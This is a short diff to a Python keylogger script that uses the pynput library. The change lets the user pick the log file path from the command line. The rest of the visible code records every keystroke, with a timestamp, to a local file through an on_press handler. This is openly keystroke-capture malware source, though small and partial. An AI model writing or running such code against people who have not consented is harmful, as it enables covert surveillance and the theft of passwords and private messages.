@@ -1,7 +1,11 @@
 from pynput.keyboard import Key, Listener
-import logging
+import logging, sys
 
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+filePath = "./keylog.txt"
+if len(sys.argv) > 1:
+    filePath = sys.argv[1]
+
+logging.basicConfig(filename=(filePath), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
 def on_press(key):
     logging.info(str(key))
